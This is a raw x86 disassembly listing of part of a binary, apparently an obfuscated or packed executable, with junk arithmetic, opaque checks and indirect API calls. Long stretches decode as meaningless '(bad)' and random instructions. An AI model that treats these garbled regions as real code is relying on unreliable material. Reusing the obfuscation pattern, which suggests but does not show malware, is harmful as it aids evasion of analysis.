  420287:	stc    
  420288:	out    dx,eax
  420289:	push   edx
  42028a:	push   ss
  42028b:	jno    0x42026b
  42028d:	sub    BYTE PTR [ecx-0x3c],cl
  420290:	hlt    
  420291:	mov    dh,0xa1
  420293:	ror    DWORD PTR [edi],1
  420295:	xor    dh,bl
  420297:	pop    edx
  420298:	sub    ebx,DWORD PTR ds:0x7bbe5c70
  42029e:	dec    edx
  42029f:	mov    ecx,DWORD PTR [ebp-0x114]
  4202a5:	or     DWORD PTR ds:0x42824f,0x4282cb
  4202af:	sub    eax,ecx
  4202b1:	mov    ecx,DWORD PTR ds:0x428347
  4202b7:	add    DWORD PTR ds:0x4282cf,ecx
  4202bd:	mov    ecx,DWORD PTR [ebp-0x128]
  4202c3:	imul   eax,ecx
  4202c6:	imul   eax,eax,0xe4e
  4202cc:	mov    ecx,DWORD PTR [ebp-0x7c]
  4202cf:	or     eax,ecx
  4202d1:	and    DWORD PTR ds:0x42834b,ebx
  4202d7:	mov    ecx,DWORD PTR [ebp+0x8]
  4202da:	sub    DWORD PTR ds:0x428127,0x428247
  4202e4:	lea    eax,[ecx+eax*1+0x46210209]
  4202eb:	add    DWORD PTR ds:0x42833b,0x42811f
  4202f5:	push   eax
  4202f6:	add    DWORD PTR ds:0x428233,0x4281eb
  420300:	call   0x414116
  420305:	cmp    DWORD PTR ds:0x4282cb,0x0
  42030c:	mov    DWORD PTR ds:0x428223,edx
  420312:	mov    esi,DWORD PTR ds:0x4281eb
  420318:	mov    DWORD PTR ds:0x4282c7,ebx
  42031e:	mov    DWORD PTR ds:0x4282d7,0x5564
  420328:	jmp    0x420388
  42032d:	mov    DWORD PTR ds:0x428143,0x3019
  420337:	not    DWORD PTR ds:0x4282cb
  42033d:	cmp    DWORD PTR ds:0x4282cb,0x0
  420344:	jae    0x42036f
  42034a:	push   DWORD PTR [ebp-0x24]
  42034d:	push   0x42832b
  420352:	push   DWORD PTR [ebp-0x1c]
  420355:	push   DWORD PTR [ebp-0xc]
  420358:	push   0x6e6a
  42035d:	call   DWORD PTR ds:0x428e7c
  420363:	adc    ecx,DWORD PTR ds:0x428203
  420369:	xor    DWORD PTR ds:0x4282bf,edx
  42036f:	add    ecx,esi
  420371:	mov    ecx,DWORD PTR ds:0x4281db
  420377:	mov    esi,DWORD PTR ds:0x428293
  42037d:	sub    esi,ecx
  42037f:	and    ecx,DWORD PTR [ecx+esi*1]
  420382:	sbb    DWORD PTR ds:0x428147,ecx
  420388:	mov    ecx,eax
  42038a:	mov    eax,DWORD PTR [ebp-0xc4]
  420390:	add    esi,0x7195
  420396:	imul   eax,eax,0x21b3
  42039c:	sbb    DWORD PTR ds:0x4282bb,ebx
  4203a2:	add    eax,DWORD PTR [ebp-0xe4]
  4203a8:	and    eax,0xd5c
  4203ad:	cmp    DWORD PTR ds:0x428337,0x0
  4203b4:	mov    DWORD PTR ds:0x42825f,ebx
  4203ba:	mov    esi,0x156a
  4203bf:	movzx  esi,WORD PTR ds:0x42815b
  4203c6:	jmp    0x420422
  4203cb:	mov    DWORD PTR ds:0x42821f,0x2dc
  4203d5:	mov    DWORD PTR ds:0x42821b,edi
  4203db:	cmp    DWORD PTR ds:0x428337,0x0
  4203e2:	jae    0x420410
  4203e8:	push   0x427faf
  4203ed:	call   DWORD PTR ds:0x428e80
  4203f3:	movzx  esi,WORD PTR ds:0x428137
  4203fa:	add    DWORD PTR ds:0x4282b7,esi
  420400:	adc    DWORD PTR ds:0x428157,ebx
  420406:	add    DWORD PTR ds:0x428333,0x22a2
  420410:	and    esi,DWORD PTR ds:0x428333
  420416:	or     DWORD PTR ds:0x42832f,ecx
  42041c:	sbb    esi,DWORD PTR ds:0x4282b3
  420422:	sub    eax,0x2e81
  420427:	cmp    DWORD PTR ds:0x428233,0x0
  42042e:	mov    DWORD PTR ds:0x428333,0x5615
  420438:	mov    DWORD PTR ds:0x42812b,0x419b
  420442:	mov    DWORD PTR ds:0x42814f,0x389d
  42044c:	not    DWORD PTR ds:0x428223
  420452:	jmp    0x4204b6
  420457:	mov    esi,0x7b57
  42045c:	cmp    DWORD PTR ds:0x428233,0x0
  420463:	je     0x4204a0
  420469:	push   0x4281ff
  42046e:	push   DWORD PTR [ebp-0x24]
  420471:	call   DWORD PTR ds:0x428e84
  420477:	sub    DWORD PTR ds:0x4282b7,0x6950
  420481:	movzx  esi,WORD PTR ds:0x42822b
  420488:	xor    esi,DWORD PTR ds:0x4282db
  42048e:	mov    DWORD PTR ds:0x42822b,esi
  420494:	mov    esi,DWORD PTR ds:0x428213
  42049a:	or     DWORD PTR ds:0x4282af,esi
  4204a0:	xor    DWORD PTR ds:0x4282df,ecx
  4204a6:	add    DWORD PTR ds:0x4282df,ebx
  4204ac:	or     DWORD PTR ds:0x428337,0x793c
  4204b6:	xor    edx,edx
  4204b8:	add    DWORD PTR ds:0x42814b,0xc98
  4204c2:	mov    esi,0x2f1dc
  4204c7:	div    esi
  4204c9:	xor    edx,edx
  4204cb:	xor    eax,0x56ef
  4204d0:	add    ecx,eax
  4204d2:	adc    DWORD PTR ds:0x42812f,ebx
  4204d8:	mov    DWORD PTR [ebp-0x90],ecx
  4204de:	sbb    DWORD PTR ds:0x428367,0x2859
  4204e8:	mov    DWORD PTR [ebp-0xe0],0x7a31
  4204f2:	mov    DWORD PTR [ebp-0x44],0x2514
  4204f9:	cmp    DWORD PTR ds:0x42814b,0x0
  420500:	mov    DWORD PTR ds:0x4282b3,0x6f69
  42050a:	mov    edx,0x2839
  42050f:	jmp    0x42057e
  420514:	movzx  ecx,WORD PTR ds:0x42824f
  42051b:	cmp    DWORD PTR ds:0x42814b,0x0
  420522:	jne    0x420555
  420528:	push   0x1336
  42052d:	push   DWORD PTR [ebp-0xc]
  420530:	push   0x75c6
  420535:	push   0x3ce6
  42053a:	push   DWORD PTR [ebp-0x1c]
  42053d:	call   DWORD PTR ds:0x428e88
  420543:	mov    esi,DWORD PTR ds:0x42813b
  420549:	sbb    DWORD PTR ds:0x428157,esi
  42054f:	and    DWORD PTR ds:0x428253,edx
  420555:	sbb    DWORD PTR ds:0x428207,edx
  42055b:	mov    esi,DWORD PTR ds:0x42833f
  420561:	or     DWORD PTR ds:0x428343,esi
  420567:	mov    esi,DWORD PTR ds:0x428167
  42056d:	mov    edx,DWORD PTR ds:0x4282ff
  420573:	sub    esi,edx
  420575:	and    esi,DWORD PTR [esi+edx*1]
  420578:	adc    DWORD PTR ds:0x42833f,edx
  42057e:	mov    DWORD PTR [ebp-0xdc],0x699c
  420588:	mov    DWORD PTR [ebp-0xd8],0x1
  420592:	adc    esi,eax
  420594:	mov    DWORD PTR [ebp-0x24],0x7901
  42059b:	cmp    DWORD PTR ds:0x428133,0x0
  4205a2:	not    esi
  4205a4:	mov    DWORD PTR ds:0x428357,0x3e17
  4205ae:	jmp    0x420635
  4205b3:	mov    DWORD PTR ds:0x4281f3,0x2222
  4205bd:	not    DWORD PTR ds:0x428203
  4205c3:	cmp    DWORD PTR ds:0x428133,0x0
  4205ca:	jge    0x42060e
  4205d0:	push   0x185b
  4205d5:	push   0x42835f
  4205da:	push   0x89e7
  4205df:	push   DWORD PTR [ebp-0x20]
  4205e2:	call   DWORD PTR ds:0x428e0c
  4205e8:	xor    edx,DWORD PTR ds:0x428207
  4205ee:	mov    ecx,DWORD PTR ds:0x4281ef
  4205f4:	or     DWORD PTR ds:0x42811f,ecx
  4205fa:	mov    ecx,DWORD PTR ds:0x428293
  420600:	mov    ecx,DWORD PTR [ecx]
  420602:	and    DWORD PTR ds:0x42835b,ecx
  420608:	and    esi,0x3af9
  42060e:	and    ecx,0x78a0
  420614:	mov    edx,DWORD PTR ds:0x42823b
  42061a:	xor    DWORD PTR ds:0x428227,edx
  420620:	movzx  ecx,WORD PTR ds:0x428213
  420627:	and    ecx,DWORD PTR ds:0x42834b
  42062d:	mov    DWORD PTR ds:0x428213,ecx
  420633:	sub    ecx,edx
  420635:	mov    DWORD PTR [ebp-0xc0],0x3e2c
  42063f:	xor    DWORD PTR ds:0x42835f,0x275e
  420649:	mov    DWORD PTR [ebp-0x78],0x37f2
  420650:	sbb    ecx,0x6514
  420656:	mov    DWORD PTR [ebp-0x10],0x62ba
  42065d:	jmp    0x4209b9
  420662:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420663:	(bad)  
  420664:	mov    ?,ebx
  420666:	push   0x3a
  420668:	and    eax,0xe3891e9e
  42066d:	stos   BYTE PTR es:[edi],al
  42066e:	cli    
  42066f:	imul   ebp,DWORD PTR [ebx],0x161dacbe
  420675:	sbb    BYTE PTR [ebx-0x6e7e7ee],ah
  42067b:	sbb    al,0x62
  42067d:	test   BYTE PTR [ecx+0x77],0xfb
  420681:	jno    0x420696
  420683:	push   eax
  420684:	test   eax,0xa90ed0c5
  420689:	lods   al,BYTE PTR ds:[esi]
  42068a:	mov    ecx,0xb90590eb
  42068f:	push   eax
  420690:	inc    ebp
  420691:	mov    edi,0x7de3c521
  420696:	inc    edi
  420697:	xor    eax,DWORD PTR [edx+0x2d]
  42069a:	dec    eax
  42069b:	inc    ecx
  42069c:	and    BYTE PTR [ecx-0x2f],0xe0
  4206a0:	adc    dl,BYTE PTR [ebp+0x27]
  4206a3:	xor    ebp,DWORD PTR [edx+0x29]
  4206a6:	fcomp  QWORD PTR [ebp-0x79]
  4206a9:	das    
  4206aa:	arpl   WORD PTR [eax-0x10],bx
  4206ad:	loope  0x42064c
  4206af:	mov    bl,0xa0
  4206b1:	pop    eax
  4206b2:	sub    esp,ebp
  4206b4:	jbe    0x4206c8
  4206b6:	daa    
  4206b7:	(bad)  
  4206b8:	pshufw mm1,QWORD PTR [esi+0xf85d1af],0x88
  4206c0:	add    BYTE PTR [eax],ch
  4206c2:	push   ecx
  4206c3:	dec    edi
  4206c4:	stos   DWORD PTR es:[edi],eax
  4206c5:	pop    edx
  4206c6:	lods   al,BYTE PTR ds:[esi]
  4206c7:	mov    ebx,0xea4ae16f
  4206cc:	pop    ds
  4206cd:	add    BYTE PTR [ebp+0x67],dh
  4206d0:	(bad)  
  4206d1:	xlat   BYTE PTR ds:[ebx]
  4206d2:	shl    BYTE PTR [ecx],cl
  4206d4:	inc    eax
  4206d5:	outs   dx,BYTE PTR ds:[esi]
  4206d6:	sbb    esp,esi
  4206d8:	adc    BYTE PTR ds:0x4a791036,0x81
  4206df:	push   esi
  4206e0:	imul   ecx,DWORD PTR [ecx-0x137a1f76],0x60
  4206e7:	aam    0xe9
  4206e9:	mov    al,0xf4
  4206eb:	pop    esi
  4206ec:	sbb    bl,BYTE PTR [edx+esi*8-0x48]
  4206f0:	dec    esp
  4206f1:	out    0xd9,al
  4206f3:	(bad)  
  4206f4:	loope  0x420757
  4206f6:	push   ebp
  4206f7:	lods   eax,DWORD PTR ds:[esi]
  4206f8:	rol    DWORD PTR [edi-0x122b76a9],0x9f
  4206ff:	cwde   
  420700:	inc    ebx
  420701:	pusha  
  420702:	pop    edi
  420703:	leave  
  420704:	sub    al,0x4a
  420706:	cs hlt 
  420708:	and    BYTE PTR [eax+0xb],bh
  42070b:	cmp    eax,0x2bf9de54
  420710:	adc    eax,0x1853c5dd
  420715:	push   ss
  420716:	mov    DWORD PTR [edx+0x62],edx
  420719:	mov    edx,0x470d254c
  42071e:	(bad)  
  42071f:	push   0xffffffb8
  420721:	mov    esi,0x2e8a1bbc
  420726:	lods   eax,DWORD PTR ds:[esi]
  420727:	mov    esp,DWORD PTR [eax+0xf]
  42072a:	popf   
  42072b:	bndstx [esi+0x224272d],bnd3
  420732:	cs mov cl,0xd
  420735:	mov    esp,0x25b63857
  42073a:	xor    al,0xbe
  42073c:	mov    DWORD PTR [eax+0x34],edi
  42073f:	(bad)  
  420740:	pop    esi
  420741:	inc    esi
  420742:	test   eax,0xbfb64e48
  420747:	mov    bl,0xdb
  420749:	aas    
  42074a:	push   edx
  42074b:	dec    ebx
  42074c:	mov    BYTE PTR [edi],cl
  42074e:	stc    
  42074f:	test   eax,0xbd95e4c7
  420754:	loop   0x420769
  420756:	(bad)  
  420757:	cmp    al,0x86
  420759:	push   esi
  42075a:	aad    0xf2
  42075c:	mov    edx,0xe577de16
  420761:	test   eax,0xc909d490
  420766:	cmp    eax,0xb689abf4
  42076b:	not    DWORD PTR [ebx]
  42076d:	pop    esi
  42076e:	ins    DWORD PTR es:[edi],dx
  42076f:	dec    eax
  420770:	push   ebx
  420771:	imul   edi,DWORD PTR [edi+0x710580f8],0x37fa8f9
  42077b:	inc    esi
  42077c:	cmp    dl,dh
  42077e:	jmp    0x4207d6
  420780:	pushf  
  420781:	bound  esi,QWORD PTR [edx]
  420783:	mov    cl,0x2e
  420785:	stc    
  420786:	scas   al,BYTE PTR es:[edi]
  420787:	dec    edx
  420788:	dec    edx
  420789:	xchg   edi,eax
  42078a:	loopne 0x42073c
  42078c:	sbb    eax,DWORD PTR [edi+esi*2+0x1e20223d]
  420793:	cmp    bh,BYTE PTR [edx-0x2d]
  420796:	adc    DWORD PTR [ebx],0x71
  420799:	pop    ecx
  42079a:	xor    bl,bl
  42079c:	icebp  
  42079d:	stos   DWORD PTR es:[edi],eax
  42079e:	enter  0x7513,0xb4
  4207a2:	and    dh,0x44
  4207a5:	and    eax,0xacc3738c
  4207aa:	mov    bl,0x6f
  4207ac:	dec    esi
  4207ad:	sub    al,0xb3
  4207af:	ret    
  4207b0:	push   edi
  4207b1:	fcmove st,st(5)
  4207b3:	sbb    eax,0xc37145ec
  4207b8:	xchg   esi,eax
  4207b9:	inc    ebx
  4207ba:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4207bb:	mov    al,ds:0x4d96521c
  4207c0:	leave  
  4207c1:	mov    ds,WORD PTR [edi+ebp*4+0x4]
  4207c5:	psllw  mm0,QWORD PTR [ebx-0x4b]
  4207c9:	pop    eax
  4207ca:	addr16 loop 0x420830
  4207cd:	inc    ebp
  4207ce:	iret   
  4207cf:	jnp    0x4207ea
  4207d1:	mov    edx,0x6e4aeedb
  4207d6:	jb     0x420840
  4207d8:	sbb    ebx,ebx
  4207da:	mov    al,0x34
  4207dc:	pop    edx
  4207dd:	repnz mov al,ds:0x9da89e02
  4207e3:	sub    eax,0x2ff3b714
  4207e8:	sub    ecx,DWORD PTR [esi-0x1c]
  4207eb:	or     DWORD PTR [esi-0x57065d13],0x44b273ca
  4207f5:	pop    ss
  4207f6:	int    0x43
  4207f8:	dec    ebp
  4207f9:	mov    WORD PTR ds:0xac41b371,es
  4207ff:	mov    eax,ds:0x82a8fb50
  420804:	cmp    DWORD PTR [ebx-0x71],ebp
  420807:	loope  0x420857
  420809:	sub    cl,BYTE PTR [eax]
  42080b:	inc    eax
  42080c:	lahf   
  42080d:	pusha  
  42080e:	cdq    
  42080f:	mov    BYTE PTR [ebx],ah
  420811:	adc    bl,bh
  420813:	xor    DWORD PTR [edi-0xb],edx
  420816:	test   eax,0x76a69b7b
  42081b:	lods   eax,DWORD PTR ds:[esi]
  42081c:	or     edi,DWORD PTR [ebx]
  42081e:	ds aas 
  420820:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420821:	adc    DWORD PTR [ebp-0x77],esi
  420824:	pop    eax
  420825:	shl    BYTE PTR [ecx-0x392f9cf5],0x67
  42082c:	pop    esi
  42082d:	sub    BYTE PTR [ecx-0x5f7f3ccd],dl
  420833:	add    esp,esi
  420835:	gs pop edi
  420837:	iret   
  420838:	jmp    0x4208b5
  42083a:	mov    WORD PTR [esi],ds
  42083c:	xor    eax,0xb9ab292f
  420841:	pop    ds
  420842:	rep lods al,BYTE PTR ds:[esi]
  420844:	jmp    0x4207cf
  420846:	(bad)
  420849:	push   edi
  42084a:	lock ror DWORD PTR [esi+esi*4-0x486e1ab0],cl
  420852:	jle    0x4207d8
  420854:	jbe    0x4207fa
  420856:	adc    dh,ah
  420858:	std    
  420859:	out    dx,al
  42085a:	(bad)  
  42085b:	loopne 0x4207e7
  42085d:	shl    DWORD PTR ds:0x10998977,0x2f
  420864:	mul    DWORD PTR [ebp+0x46]
  420867:	neg    cl
  420869:	aam    0x6b
  42086b:	js     0x4208ea
  42086d:	or     BYTE PTR [edx],ah
  42086f:	scas   eax,DWORD PTR es:[edi]
  420870:	imul   edi,DWORD PTR [eax+0x2143c1ec],0xffffffa7
  420877:	jp     0x420807
  420879:	xchg   esp,eax
  42087a:	push   edi
  42087b:	and    al,0x7b
  42087d:	out    dx,al
  42087e:	jge    0x42083e
  420880:	jo     0x4208f8
  420882:	inc    esp
  420883:	xchg   ebx,eax
  420884:	cmp    bh,BYTE PTR [ebp-0x4d]
  420887:	jl     0x4208af
  420889:	les    edi,FWORD PTR [ebp+0xa]
  42088c:	imul   edi,esp,0x138eb2db
  420892:	adc    BYTE PTR [edi+0x36],cl
  420895:	repz pop edi
  420897:	ret    0x442c
  42089a:	cmp    ah,al
  42089c:	inc    ecx
  42089d:	(bad)  
  42089e:	addr16 add al,0x44
  4208a1:	enter  0x274b,0x82
  4208a5:	fidiv  DWORD PTR [edx]
  4208a7:	jecxz  0x420870
  4208a9:	mov    edi,edx
  4208ab:	rcl    BYTE PTR [edx-0x3b8cd2b8],1
  4208b1:	mov    al,ds:0xd557c48b
  4208b6:	sahf   
  4208b7:	pop    ebx
  4208b8:	fst    QWORD PTR [esi+edi*1-0x31]
  4208bc:	je     0x42087e
  4208be:	ins    BYTE PTR es:[edi],dx
  4208bf:	repz adc eax,esp
  4208c2:	lds    esp,FWORD PTR [edx+0x5c4a838f]
  4208c8:	and    al,0x36
  4208ca:	fdiv   QWORD PTR fs:[ebp+edx*2+0x555c8b4e]
  4208d2:	rol    edi,1
  4208d4:	in     al,dx
  4208d5:	scas   al,BYTE PTR es:[edi]
  4208d6:	jb     0x4208d0
  4208d8:	mov    edi,DWORD PTR [edx]
  4208da:	test   eax,0x76123dc9
  4208df:	inc    edx
  4208e0:	add    DWORD PTR [eax-0xfa0b6fd],ecx
  4208e6:	and    cl,cl
  4208e8:	fadd   QWORD PTR [esi+0x4a]
  4208eb:	mov    ds:0xaebfc2,eax
  4208f0:	xor    eax,0x41806f65
  4208f5:	sub    DWORD PTR cs:[esi],0xb326b031
  4208fc:	mov    WORD PTR [ebx+eiz*8-0x52904bd0],ds
  420903:	inc    edx
  420904:	mov    al,0x10
  420906:	xchg   edx,eax
  420907:	in     al,dx
  420908:	addr16 leave 
  42090a:	xor    ecx,DWORD PTR [eax-0x64e3da4d]
  420910:	lods   al,BYTE PTR ds:[esi]
  420911:	adc    al,0xc7
  420913:	and    DWORD PTR [eax+0x32ceeeee],0x1a
  42091a:	inc    ecx
  42091b:	mov    eax,0xb6ce1ba8
  420920:	loopne 0x42099a
  420922:	jg     0x420987
  420924:	out    0x8f,al
  420926:	push   es
  420927:	pusha  
  420928:	cmp    edi,edx
  42092a:	fdivp  st(3),st
  42092c:	ins    DWORD PTR es:[edi],dx
  42092d:	sub    al,BYTE PTR [esi-0x4b2a893b]
  420933:	push   esi
  420934:	dec    eax
  420935:	xor    BYTE PTR [ebp+eiz*2-0x76],dh
  420939:	lahf   
  42093a:	mov    WORD PTR [edx+edi*2+0x3b],cs
  42093e:	hlt    
  42093f:	mov    ecx,0xc218e93
  420944:	jb     0x42099d
  420946:	sbb    al,0xf0
  420948:	cmp    DWORD PTR [ebp+0x5edc271c],ecx
  42094e:	jae    0x420918
  420950:	js     0x420952
  420952:	das    
  420953:	inc    edi
  420954:	test   DWORD PTR [ebx+ecx*8+0x7352749f],esp
  42095b:	jae    0x42097a
  42095d:	gs push edi
  42095f:	mov    bl,BYTE PTR [edi+0x8]
  420962:	pop    eax
  420963:	mov    dh,0xe1
  420965:	xchg   esi,eax
  420966:	outs   dx,DWORD PTR ds:[esi]
  420967:	or     al,0x78
  420969:	xchg   BYTE PTR [edx],ah
  42096b:	sbb    DWORD PTR [edx],edi
  42096d:	pop    es
  42096e:	or     DWORD PTR [ebx],ebx
  420970:	cdq    
  420971:	xchg   ebx,esi
  420973:	das    
  420974:	push   ss
  420975:	cwde   
  420976:	xor    dh,BYTE PTR [ebx+esi*8]
  420979:	arpl   WORD PTR [eax-0x79],cx
  42097c:	add    al,0x1c
  42097e:	pop    ecx
  42097f:	push   cs
  420980:	mov    edi,0xc30538bf
  420985:	cli    
  420986:	cmp    esp,DWORD PTR [esp+ebp*2]
  420989:	and    esp,DWORD PTR [edx]
  42098b:	xor    dh,al
  42098d:	into   
  42098e:	in     al,0x55
  420990:	cmp    al,0xb0
  420992:	mov    ebp,0x2b7d37af
  420997:	pusha  
  420998:	inc    ebx
  420999:	sahf   
  42099a:	sub    ebx,DWORD PTR [ebx]
  42099c:	stos   BYTE PTR es:[edi],al
  42099d:	adc    DWORD PTR [eax],ebp
  42099f:	shl    BYTE PTR [ebx+0x33],0x49
  4209a3:	sti    
  4209a4:	cmp    al,0xc4
  4209a6:	and    esi,DWORD PTR [eax+0x6b]
  4209a9:	inc    esi
  4209aa:	bound  edx,QWORD PTR [eax]
  4209ac:	and    DWORD PTR [edi+0x4c2cbf2e],ecx
  4209b2:	sbb    bh,dl
  4209b4:	sub    bh,BYTE PTR [esi]
  4209b6:	clc    
  4209b7:	jg     0x420970
  4209b9:	mov    DWORD PTR [ebp-0x94],0x561c
  4209c3:	mov    DWORD PTR [ebp-0x34],0x58bc
  4209ca:	mov    DWORD PTR [ebp-0x60],0x24c7
  4209d1:	xor    eax,DWORD PTR ds:0x428223
  4209d7:	mov    DWORD PTR [ebp-0x5c],0x7a45
  4209de:	xor    DWORD PTR ds:0x4282bf,0x80d
  4209e8:	mov    eax,DWORD PTR [ebp-0x34]
  4209eb:	cmp    DWORD PTR ds:0x4282e7,0x0
  4209f2:	movzx  esi,WORD PTR ds:0x4281ff
  4209f9:	mov    ecx,0x4d8b
  4209fe:	jmp    0x420a54
  420a03:	mov    DWORD PTR ds:0x42812b,0x6139
  420a0d:	mov    DWORD PTR ds:0x428363,0x3849
  420a17:	cmp    DWORD PTR ds:0x4282e7,0x0
  420a1e:	jne    0x420a40
  420a24:	push   0x53aa
  420a29:	push   0x7054
  420a2e:	call   DWORD PTR ds:0x428e10
  420a34:	sub    DWORD PTR ds:0x4282bb,0xc6b
  420a3e:	inc    esi
  420a3f:	inc    edx
  420a40:	and    DWORD PTR ds:0x4281ef,edi
  420a46:	and    edx,0x7a3f
  420a4c:	sbb    ecx,ecx
  420a4e:	and    esi,0x2474
  420a54:	mov    ecx,DWORD PTR [ebp-0x60]
  420a57:	adc    edx,DWORD PTR ds:0x42824b
  420a5d:	mov    edx,DWORD PTR [ebp-0x5c]
  420a60:	mov    esi,DWORD PTR ds:0x4282bb
  420a66:	sub    DWORD PTR ds:0x4282cf,esi
  420a6c:	and    edx,0x160e
  420a72:	add    esi,DWORD PTR ds:0x42812f
  420a78:	sub    edx,ecx
  420a7a:	cmp    DWORD PTR ds:0x428243,0x0
  420a81:	mov    DWORD PTR ds:0x4282ab,ecx
  420a87:	mov    esi,DWORD PTR ds:0x4282e3
  420a8d:	jmp    0x420e58
  420a92:	mov    DWORD PTR ds:0x42822b,0x7aef
  420a9c:	cmp    DWORD PTR ds:0x428243,0x0
  420aa3:	je     0x420adc
  420aa9:	push   DWORD PTR [ebp-0x18]
  420aac:	push   0x4599
  420ab1:	push   DWORD PTR [ebp-0x14]
  420ab4:	push   DWORD PTR [ebp-0x10]
  420ab7:	call   DWORD PTR ds:0x428e14
  420abd:	mov    esi,DWORD PTR ds:0x42832b
  420ac3:	or     DWORD PTR ds:0x428253,esi
  420ac9:	xor    ecx,ecx
  420acb:	add    ecx,DWORD PTR ds:0x428163
  420ad1:	mov    esi,DWORD PTR ds:0x4283a7
  420ad7:	sub    ecx,esi
  420ad9:	or     ecx,DWORD PTR [ecx+esi*1]
  420adc:	mov    esi,DWORD PTR ds:0x42812b
  420ae2:	or     DWORD PTR ds:0x428253,esi
  420ae8:	add    ecx,0x4e9b
  420aee:	sbb    esi,ecx
  420af0:	sub    DWORD PTR ds:0x4282b3,ecx
  420af6:	or     esi,0x56f6
  420afc:	jmp    0x420e58
  420b01:	mov    bl,0xa9
  420b03:	lds    esp,FWORD PTR [edx-0x574d5d3d]
  420b09:	stos   BYTE PTR es:[edi],al
  420b0a:	xor    BYTE PTR [edi+0x7c],0xe2
  420b0e:	mov    ds:0x17367edd,eax
  420b13:	push   ss
  420b14:	sbb    BYTE PTR [ebx-0x69e7e7ee],ah
  420b1a:	cmp    DWORD PTR ds:0x5fec69f9,ebx
  420b20:	push   ds
  420b21:	nop
  420b22:	xchg   ebp,eax
  420b23:	arpl   WORD PTR [ebx],sp
  420b25:	pop    edx
  420b26:	dec    ebx
  420b27:	js     0x420ba8
  420b29:	ins    BYTE PTR es:[edi],dx
  420b2a:	jnp    0x420b5a
  420b2c:	leave  
  420b2d:	in     eax,0x47
  420b2f:	(bad)  
  420b30:	idiv   DWORD PTR [esi]
  420b32:	jmp    0x52af:0x580d0846
  420b39:	aaa    
  420b3a:	mov    DWORD PTR [edi+0x77ac4105],esi
  420b40:	pushf  
  420b41:	(bad)  
  420b43:	ins    BYTE PTR es:[edi],dx
  420b44:	or     ax,0xd5c5
  420b48:	xchg   BYTE PTR [eax],bl
  420b4a:	and    DWORD PTR [edx+0x3454c0b3],0x70
  420b51:	mov    edx,0xf40a6f30
  420b56:	(bad)  
  420b57:	jne    0x420bb1
  420b59:	inc    ebp
  420b5a:	jp     0x420b4a
  420b5c:	iret   
  420b5d:	nop
  420b5e:	lea    esi,[edx]
  420b60:	(bad)
  420b65:	nop
  420b66:	mov    WORD PTR [ebx-0x3c],?
  420b69:	clc    
  420b6a:	jecxz  0x420b95
  420b6c:	outs   dx,DWORD PTR ds:[esi]
  420b6d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420b6e:	ror    bh,0x9b
  420b71:	jge    0x420b99
  420b73:	rol    BYTE PTR [esi],0x3a
  420b76:	popa   
  420b77:	sbb    BYTE PTR [edi],bl
  420b79:	in     eax,0x32
  420b7b:	xchg   BYTE PTR [eax-0x6e],bl
  420b7e:	call   0xb9ac:0x3950e694
  420b85:	popa   
  420b86:	jmp    FWORD PTR [edx]
  420b88:	mov    dl,bh
  420b8a:	mov    eax,0xf331a7b9
  420b8f:	fidivr DWORD PTR [ebx-0x5e]
  420b92:	mov    eax,0x34ddc769
  420b97:	mov    DWORD PTR [edx+0x1a],edx
  420b9a:	(bad)  
  420b9c:	or     ebx,edx
  420b9e:	fimul  WORD PTR [edi+0x3a438495]
  420ba4:	cmp    esi,DWORD PTR [ebx]
  420ba6:	clc    
  420ba7:	xor    eax,0x21671ef3
  420bac:	and    eax,0xaed827
  420bb1:	adc    eax,0x32ade9d3
  420bb6:	jb     0x420be1
  420bb8:	loopne 0x420b4b
  420bba:	cdq    
  420bbb:	lea    esp,[ebp+0x8]
  420bbe:	lea    edi,[edi-0xe]
  420bc1:	mov    eax,0x62030662
  420bc6:	pushf  
  420bc7:	mov    ecx,0xc307872d
  420bcc:	fmul   st,st(1)
  420bce:	mov    ecx,0xc1a74e1c
  420bd3:	stos   DWORD PTR es:[edi],eax
  420bd4:	test   ebx,ebp
  420bd6:	ins    DWORD PTR es:[edi],dx
  420bd7:	pop    ecx
  420bd8:	mov    ch,0x5d
  420bda:	enter  0x2877,0x51
  420bde:	add    cl,BYTE PTR [esi+0x7]
  420be1:	rcr    al,cl
  420be3:	dec    ebx
  420be4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420be5:	mov    ebp,0xece8075e
  420bea:	sbb    esp,DWORD PTR [ecx+eax*1+0x681d1e9b]
  420bf1:	push   edi
  420bf2:	out    dx,eax
  420bf3:	inc    ecx
  420bf4:	jecxz  0x420bda
  420bf6:	xchg   ch,bl
  420bf8:	mov    ecx,0x2eebb2be
  420bfd:	fisubr DWORD PTR [ebx-0x360fa715]
  420c03:	xchg   ecx,eax
  420c04:	jmp    FWORD PTR [edx-0x17]
  420c07:	adc    BYTE PTR [esi+eax*8-0x7ef0e122],bh
  420c0e:	dec    esp
  420c0f:	push   0x8eb0f433
  420c14:	inc    edi
  420c15:	cwde   
  420c16:	les    ecx,FWORD PTR ds:0xc2e92fa5
  420c1c:	test   ah,al
  420c1e:	sbb    bh,BYTE PTR [esi+ebx*8-0x27f302bd]
  420c25:	xor    ecx,0xffffffdf
  420c28:	(bad)  
  420c2a:	jecxz  0x420bbd
  420c2c:	dec    edi
  420c2d:	jl     0x420ca7
  420c2f:	out    dx,eax
  420c30:	sbb    dl,BYTE PTR ds:0xb88b3a0b
  420c36:	popf   
  420c37:	aam    0x46
  420c39:	ins    DWORD PTR es:[edi],dx
  420c3a:	(bad)  
  420c3b:	sbb    bl,BYTE PTR [ebx+ebx*2+0xc320043]
  420c42:	fnstsw WORD PTR [ebx+ebx*8+0xc41bf9]
  420c49:	and    al,0xfb
  420c4b:	push   ebx
  420c4c:	mov    esi,0x40342fe6
  420c51:	push   edx
  420c52:	test   al,0xb9
  420c54:	jge    0x420c3d
  420c56:	hlt    
  420c57:	xchg   edi,eax
  420c58:	ins    DWORD PTR es:[edi],dx
  420c59:	push   0x24b80450
  420c5e:	sbb    edi,DWORD PTR [ebp+0x720ee9bd]
  420c64:	retf   0xb04d
  420c67:	or     edx,edi
  420c69:	imul   edx,DWORD PTR [ebx-0x7878e0f3],0x66
  420c70:	and    al,0x91
  420c72:	or     BYTE PTR ds:0x3016720a,cl
  420c78:	out    dx,al
  420c79:	pop    esp
  420c7a:	and    ecx,eax
  420c7c:	fiadd  DWORD PTR [eax+0x62]
  420c7f:	mov    cl,0x68
  420c81:	fsubr  st(1),st
  420c83:	jecxz  0x420c79
  420c85:	mov    ecx,0xe1486f1c
  420c8a:	jg     0x420c60
